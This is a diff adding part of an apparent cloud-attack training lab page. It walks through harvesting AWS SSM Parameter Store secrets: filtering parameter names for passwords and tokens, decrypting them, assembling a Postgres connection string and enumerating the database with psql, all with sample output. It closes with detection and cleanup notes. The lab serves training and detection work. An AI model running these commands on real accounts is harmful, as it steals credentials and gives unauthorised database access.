+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm describe-parameters \
+  --parameter-filters 'Key=Name,Option=Contains,Values=password' \
+  --query 'Parameters[*].[Name,Type]' --output table</div>
+            <div class="terminal-output">-------------------------------------------
+|         DescribeParameters              |
++----------------------------+------------+
+|  /prod/db/password         | SecureString|
++----------------------------+------------+</div>
+            <div class="terminal-cmd">$ aws ssm describe-parameters \
+  --parameter-filters 'Key=Name,Option=Contains,Values=secret,key,token' \
+  --query 'Parameters[*].[Name,Type]' --output table</div>
+            <div class="terminal-output">-------------------------------------------
+|         DescribeParameters              |
++----------------------------+------------+
+|  /api/stripe-key           | SecureString|
+|  /api/sendgrid-token       | SecureString|
+|  /app/jwt-secret           | SecureString|
+|  /deploy/github-token      | SecureString|
++----------------------------+------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">4</span>
+      <div class="step-content">
+        <div class="step-desc">Retrieve individual SecureString parameters with <code>--with-decryption</code>. This flag is required for SecureString type parameters — omitting it returns a ciphertext blob instead of the plaintext value. Assemble full database connection strings from the individual parameters for direct database access.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws ssm get-parameter --name /prod/db/password \
+  --with-decryption --query 'Parameter.Value' --output text</div>
+            <div class="terminal-output">Pr0dP@ssw0rd!2024</div>
+            <div class="terminal-cmd">$ DB_HOST=$(aws ssm get-parameter --name /prod/db/host --query 'Parameter.Value' --output text)</div>
+            <div class="terminal-cmd">$ DB_USER=$(aws ssm get-parameter --name /prod/db/username --query 'Parameter.Value' --output text)</div>
+            <div class="terminal-cmd">$ DB_PASS=$(aws ssm get-parameter --name /prod/db/password --with-decryption --query 'Parameter.Value' --output text)</div>
+            <div class="terminal-cmd">$ echo "postgresql://${DB_USER}:${DB_PASS}@${DB_HOST}:5432/maindb"</div>
+            <div class="terminal-output">postgresql://admin:Pr0dP@ssw0rd!2024@prod-db.cxyz123abc.us-east-1.rds.amazonaws.com:5432/maindb</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <span class="step-num">5</span>
+      <div class="step-content">
+        <div class="step-desc">Test the extracted database credentials to confirm access and enumerate the database contents. The assembled connection string from step 4 provides direct database access — either through the SSM port-forwarding tunnel established in L03 or directly if the RDS instance is reachable.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ psql "postgresql://admin:Pr0dP@ssw0rd!2024@prod-db.cxyz123abc.us-east-1.rds.amazonaws.com:5432/maindb" \
+  -c "\dt"</div>
+            <div class="terminal-output">             List of relations
+ Schema |      Name       | Type  | Owner
+--------+-----------------+-------+-------
+ public | users           | table | admin
+ public | orders          | table | admin
+ public | payments        | table | admin
+ public | sessions        | table | admin
+ public | api_keys        | table | admin
+(5 rows)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">describe-parameters</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Filter Secrets</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">get-parameters-by-path --with-decryption</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Harvest</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Pivot to Database</div>
+    </div>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Detection Note:</strong> <code>ssm:DescribeParameters</code> and <code>ssm:GetParametersByPath</code> are logged to CloudTrail. Bulk retrieval of all parameters (especially with <code>--with-decryption</code>) by any identity other than the expected application service role is a high-confidence finding. SSM Parameter Store is one of the most common places to find plaintext or easily decryptable credentials in AWS environments. Without proper KMS key policies and IAM restrictions, any user with <code>ssm:GetParameter</code> access can read everything. MITRE ATT&CK: <a href="https://attack.mitre.org/techniques/T1552/001/" target="_blank">T1552.001 — Unsecured Credentials: Credentials In Files</a>.
+  </div>
+
+  <div class="lab-cleanup">
+    <strong>Cleanup:</strong>
+    <ul>
+      <li>No parameters are created or modified in this enumeration-only lab — no Parameter Store cleanup required</li>
+      <li>Close any open database connections</li>
+      <li>Remove any plaintext credential files written to disk during the lab (<code>harvested_params.txt</code>, etc.)</li>
+      <li>Remove any AWS CLI profiles configured with credentials obtained during this lab</li>
+      <li>Unset any shell environment variables holding extracted credentials: <code>unset DB_HOST DB_USER DB_PASS</code></li>
+    </ul>
+  </div>
+</div>
